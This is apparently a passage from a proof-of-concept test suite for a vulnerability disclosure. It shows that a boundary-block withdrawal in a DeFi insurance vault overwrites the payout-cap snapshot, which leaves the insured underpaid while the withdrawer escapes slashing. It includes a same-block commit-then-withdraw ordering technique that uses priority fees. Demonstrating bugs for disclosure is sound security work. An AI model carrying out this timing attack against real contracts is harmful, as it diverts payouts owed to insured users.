  log(`  assets physically in the vault     : ${fxrp(vaultBalanceAtPayout)}`)
  log(`  payable per the contract's own sum : ${fxrp(activePayableAmount)}`)
  log(`  Alice rescued from the slashing    : ${fxrp(aliceGot)} of her ${fxrp(aliceStake)}`)

  return {
    paidToClaimants, aliceGot, snapshot, live, totalStake,
    vaultBalanceAtPayout, bucketAssets, activePayableAmount, requestedAmount,
  }
}

describe('PoC — a withdrawal on the period boundary shrinks that period\'s payout cap', function () {
  it('boundary withdrawal underpays the insured by exactly the withdrawn amount, and the control one second later does not', async () => {
    const ALICE = 200_000n * E6
    const BOB = 800_000n * E6
    const COVER = 1_600_000n * E18 // 2.0x the 800,000 fXRP that remains — within capacity in both runs

    console.log('')
    console.log('    ===================================================================')
    console.log('    ATTACK: Alice redeems in the block stamped exactly at the boundary')
    console.log('    ===================================================================')
    const attack = await runScenario({
      offsetSeconds: 0, aliceStake: ALICE, bobStake: BOB, coverSold: COVER,
      label: 'ATTACK',
    })

    console.log('')
    console.log('    ===================================================================')
    console.log('    CONTROL: the identical run, redemption one second later')
    console.log('    ===================================================================')
    const control = await runScenario({
      offsetSeconds: 1, aliceStake: ALICE, bobStake: BOB, coverSold: COVER,
      label: 'CONTROL',
    })

    console.log('')
    console.log('    ---------------- the one-second difference ----------------')
    console.log(`     paid to the insured : ${fxrp(attack.paidToClaimants)} (attack)  vs  ${fxrp(control.paidToClaimants)} (control)`)
    console.log(`     shortfall           : ${fxrp(control.paidToClaimants - attack.paidToClaimants)}`)
    console.log(`     Alice keeps         : ${fxrp(attack.aliceGot)} (attack)  vs  ${fxrp(control.aliceGot)} (control)`)
    console.log('')

    // The cap in the attack run is Alice's withdrawal short of the true period-start collateral.
    expect(attack.snapshot).to.equal(BOB)
    expect(control.snapshot).to.equal(ALICE + BOB)

    // The insured are underpaid by exactly the amount Alice moved out on the boundary.
    expect(control.paidToClaimants - attack.paidToClaimants).to.equal(ALICE)
    expect(attack.paidToClaimants).to.equal(BOB)
    expect(control.paidToClaimants).to.equal(ALICE + BOB)

    // And Alice escapes part of a slashing that the control run applies in full.
    // She keeps exactly W^2/A: 200,000^2 / 1,000,000 = 40,000.
    expect(control.aliceGot).to.equal(0n)
    expect(attack.aliceGot).to.equal((ALICE * ALICE) / (ALICE + BOB))
    expect(attack.aliceGot).to.equal(40_000n * E6) // the same figure as a literal, for the report

    // Where the shortfall goes: the withdrawer captures part of it, the rest stays as
    // active vault value benefiting whoever still holds shares. 40,000 + 160,000 = 200,000.
    const shortfall = control.paidToClaimants - attack.paidToClaimants
    expect(shortfall - attack.aliceGot).to.equal(160_000n * E6)

    // The collateral was never missing. All three facts are read from chain at payout time:
    // the assets are physically in the vault, the boundary withdrawal is sitting in the
    // still-payable bucket, and the contract's own payable sum equals the full stake.
    // The shortfall is therefore caused by the cap alone, not by a lack of funds.
    expect(attack.vaultBalanceAtPayout).to.equal(ALICE + BOB)
    expect(control.vaultBalanceAtPayout).to.equal(ALICE + BOB)
    expect(attack.bucketAssets).to.equal(ALICE)
    expect(control.bucketAssets).to.equal(ALICE)
    expect(attack.activePayableAmount).to.equal(ALICE + BOB)
    expect(control.activePayableAmount).to.equal(ALICE + BOB)

    // The same payout was requested in both runs, and it exceeds what either run pays:
    // neither control nor attack settles this claim in full, they differ only in the cap.
    expect(attack.requestedAmount).to.equal(COVER / 10n ** 12n)
    expect(control.requestedAmount).to.equal(COVER / 10n ** 12n)
    expect(control.paidToClaimants).to.be.lessThan(control.requestedAmount)
  })

  it('the shortfall scales with the withdrawer\'s share: a dominant staker halves a claim the vault could pay in full', async () => {
    const ALICE = 900_000n * E6
    const BOB = 100_000n * E6
    // 2.0x the 100,000 fXRP the corrupted snapshot reports. Kept identical in both runs so the
    // claim size is not what differs.
    const COVER = 200_000n * E18
    const CLAIM = 200_000n * E6 // the claim in vault-asset units, at $1.00 per fXRP

    console.log('')
    console.log('    ===================================================================')
    console.log('    Dominant staker exits on the boundary')
    console.log('    ===================================================================')
    const attack = await runScenario({
      offsetSeconds: 0, aliceStake: ALICE, bobStake: BOB, coverSold: COVER,
      label: 'DOMINANT STAKER — ATTACK',
    })
    const control = await runScenario({
      offsetSeconds: 1, aliceStake: ALICE, bobStake: BOB, coverSold: COVER,
      label: 'DOMINANT STAKER — CONTROL',
    })

    // The cap collapses to what is left after her exit, even though her assets are still
    // counted as payable and are still physically in the vault.
    expect(attack.snapshot).to.equal(BOB)
    expect(control.snapshot).to.equal(ALICE + BOB)

    // The control pays the claim in full; the attack pays half of it.
    expect(control.paidToClaimants).to.equal(CLAIM)
    expect(attack.paidToClaimants).to.equal(BOB)
    expect(attack.paidToClaimants * 2n).to.equal(control.paidToClaimants)

    // Her bucket absorbs its pro-rata share of whatever is actually paid, so she keeps
    // ALICE - paid * ALICE/(ALICE+BOB) in each run. The smaller payment leaves her more.
    const kept = (paid) => ALICE - (paid * ALICE) / (ALICE + BOB)
    expect(attack.aliceGot).to.equal(kept(attack.paidToClaimants)) // 810,000
    expect(control.aliceGot).to.equal(kept(control.paidToClaimants)) // 720,000
    expect(attack.aliceGot - control.aliceGot).to.equal(90_000n * E6)

    // The money was physically present and the contract classified all of it as payable in
    // both runs, so again the shortfall comes from the cap and not from missing funds.
    expect(attack.vaultBalanceAtPayout).to.equal(ALICE + BOB)
    expect(control.vaultBalanceAtPayout).to.equal(ALICE + BOB)
    expect(attack.bucketAssets).to.equal(ALICE)
    expect(control.bucketAssets).to.equal(ALICE)
    expect(attack.activePayableAmount).to.equal(ALICE + BOB)
    expect(control.activePayableAmount).to.equal(ALICE + BOB)

    // The same claim was requested in both runs; only the cap differs.
    expect(attack.requestedAmount).to.equal(CLAIM)
    expect(control.requestedAmount).to.equal(CLAIM)

    console.log('')
    console.log(`     claim filed (test 2)           : ${fxrp(CLAIM)}`)
    console.log(`     paid — control  : ${fxrp(control.paidToClaimants)}  (${pct(control.paidToClaimants, CLAIM)} of the claim)`)
    console.log(`     paid — attack   : ${fxrp(attack.paidToClaimants)}  (${pct(attack.paidToClaimants, CLAIM)} of the claim)`)
    console.log(`     the insured lose: ${fxrp(control.paidToClaimants - attack.paidToClaimants)}`)
    console.log(`     Alice keeps     : ${fxrp(attack.aliceGot)} (attack)  vs  ${fxrp(control.aliceGot)} (control)  =  +${fxrp(attack.aliceGot - control.aliceGot)}`)
    console.log('')
  })

  // ---------------------------------------------------------------------------
  // The shortfall is NOT bounded by the reduced allocation capacity. If the
  // allocator commits earlier in the same boundary block — which is the natural
  // time for a matcher to run — the commitment is sized against the true
  // collateral, and only the payout is later capped by the overwritten snapshot.
  // ---------------------------------------------------------------------------
  it('commit-then-withdraw inside the same boundary block: cover is sized on the true collateral and the payout is capped at a tenth of it', async () => {
    const ctx = await deployStack()
    const { vault, allocator, incidentManager, asset, usdc } = ctx
    const log = (...a) => console.log('   ', ...a)

    const ALICE = 900_000n * E6
    const BOB = 100_000n * E6
    const TOTAL = ALICE + BOB
    const COVER = 2_000_000n * E18 // 2.0x the TRUE collateral of 1,000,000 fXRP

    for (const [who, amount] of [[ctx.alice, ALICE], [ctx.bob, BOB]]) {
      await asset.mint(who.address, amount)
      await asset.connect(who).approve(vault.target, amount)
      await vault.connect(who).deposit(amount, who.address)
    }
    await usdc.mint(ctx.buyer.address, 10_000_000n * E6)
    await usdc.connect(ctx.buyer).approve(allocator.target, ethers.MaxUint256)

    await time.increase(WEEK)
    const orders = [{ id: 0, marketId: ctx.marketA, cover: COVER / 2n },
                    { id: 1, marketId: ctx.marketB, cover: COVER / 2n }]
    for (const o of orders) await createOrder(ctx, o.marketId, o.cover)
    await refreshOracle(ctx)

    // Both transactions land in the SAME block, stamped exactly at the boundary,
    // with the commit ordered first via a higher priority fee.
    const boundary = await vault.currentPeriodEnd()
    const tree = treeOf(orders)
    await ethers.provider.send('evm_setAutomine', [false])
    await time.setNextBlockTimestamp(boundary)

    // The oracle answer must be fresh as of the boundary block; refresh it in the same block,
    // ahead of the commit.
    await ctx.priceFeed.setAnswer(E18, { maxFeePerGas: 50_000_000_000n, maxPriorityFeePerGas: 30_000_000_000n })

    const commitTx = await allocator.connect(ctx.allocatorRole)
      .commitAllocation(2, tree.root, COVER, COVER, { maxFeePerGas: 50_000_000_000n, maxPriorityFeePerGas: 20_000_000_000n })
    const withdrawTx = await vault.connect(ctx.alice)
      .redeem(await vault.balanceOf(ctx.alice.address), ctx.alice.address, ctx.alice.address,
              { maxFeePerGas: 50_000_000_000n, maxPriorityFeePerGas: 1_000_000_000n })

    await ethers.provider.send('evm_mine', [])
    await ethers.provider.send('evm_setAutomine', [true])

    const cr = await commitTx.wait()
    const wr = await withdrawTx.wait()
    expect(cr.status).to.equal(1)
    expect(wr.status).to.equal(1)
    expect(cr.blockNumber).to.equal(wr.blockNumber) // same block
    expect(cr.index).to.be.lessThan(wr.index) // commit ordered first

    const periodStart = await vault.currentPeriodStart()
    expect(BigInt(periodStart)).to.equal(BigInt(boundary))
    expect(await vault.currentPeriod()).to.equal(2n)

    // The commitment was sized against the true collateral; the snapshot now reads
    // the post-withdrawal figure, because the withdrawal overwrote the same key.
    expect(await vault.totalAssetsAt(periodStart)).to.equal(BOB)
    const commit = await allocator.getAllocationCommitment(2)
    expect(commit.totalAvailableCapacity).to.equal(COVER)
    expect(commit.totalDeclaredAllocated).to.equal(COVER)

    await settleAll(ctx, tree, orders)

    // The cover was not merely declared in the tree: the whole $2,000,000 actually settled
    // against the commitment, which is what the insured end up covered for.
    expect((await allocator.getAllocationCommitment(2)).totalSettledCover).to.equal(COVER)

    // Every asset is still physically in the vault at this point.
    expect(await asset.balanceOf(vault.target)).to.equal(TOTAL)

    const incidentId = await openIncident(ctx, {
      ref: 'INC-SAMEBLOCK', title: 'covered protocols drained', captureTimestamp: periodStart,
      losses: [{ coverTokenId: 0, marketId: ctx.marketA, amount: orders[0].cover },
               { coverTokenId: 1, marketId: ctx.marketB, amount: orders[1].cover }],
    })
    // What the contract itself considers payable at this moment: live active assets plus the
    // boundary withdrawal, which its own rules keep exposed. It adds up to the whole TOTAL.
    const bucketAssets = await vault.withdrawAssets(3)
    expect(bucketAssets).to.equal(ALICE)
    expect(await vault.withdrawAssets(4)).to.equal(0n)
    expect((await vault.totalAssets()) + bucketAssets).to.equal(TOTAL)

    const before = await asset.balanceOf(ctx.payoutReceiver.address)
    const payoutTx = await incidentManager.connect(ctx.approver).approveCurrentAssessment(incidentId)
    const paid = (await asset.balanceOf(ctx.payoutReceiver.address)) - before

    // The cap is the overwritten snapshot, so only BOB's share can be paid — even though
    // the vault holds the whole TOTAL and counts all of it as payable.
    expect(paid).to.equal(BOB)

    // Confirmed against the vault's own event rather than the balance delta alone: a claim
    // for the full TOTAL was requested, and a tenth of it was paid.
    const payoutLog = (await payoutTx.wait()).logs
      .map((l) => { try { return vault.interface.parseLog(l) } catch { return null } })
      .find((l) => l && l.name === 'PayoutExecuted')
    expect(payoutLog, 'the vault must emit PayoutExecuted').to.not.equal(undefined)
    expect(payoutLog.args.requestedAmount).to.equal(COVER / 10n ** 12n)
    expect(payoutLog.args.paidAmount).to.equal(BOB)
    expect(payoutLog.args.captureTimestamp).to.equal(periodStart)

    // The cover really was committed at 2.0x the true collateral: COVER is USD with 18
    // decimals, TOTAL is the vault asset with 6, hence the 1e12 scale factor.
    expect(COVER).to.equal(2n * TOTAL * 10n ** 12n)

    // And the shortfall against an honest cap is 900,000 fXRP, 90% of the collateral held.
    expect(TOTAL - paid).to.equal(900_000n * E6)
    expect(((TOTAL - paid) * 100n) / TOTAL).to.equal(90n)

    log('')
    log('  commit and withdrawal in ONE block stamped at the period-2 boundary')
    log(`    cover committed against true collateral : ${usd(COVER)}  (2.0x of ${fxrp(TOTAL)})`)
    log(`    totalAssetsAt(period 2 start) afterwards: ${fxrp(await vault.totalAssetsAt(periodStart))}  <- overwritten by the withdrawal`)
    log(`    collateral physically in the vault      : ${fxrp(TOTAL)}`)
    log(`    claim filed                             : ${usd(COVER)}`)
    log(`    actually paid to the insured            : ${fxrp(paid)}  (${pct(paid, TOTAL)} of the collateral held)`)
    log(`    shortfall versus an honest cap          : ${fxrp(TOTAL - paid)}  = ${pct(TOTAL - paid, TOTAL)}`)
    log('')
    log('  This is the case the "self-limiting" argument misses: reduced capacity bounds the')
    log('  shortfall only when the commitment happens AFTER the withdrawal.')
    log('')
  })
})
```
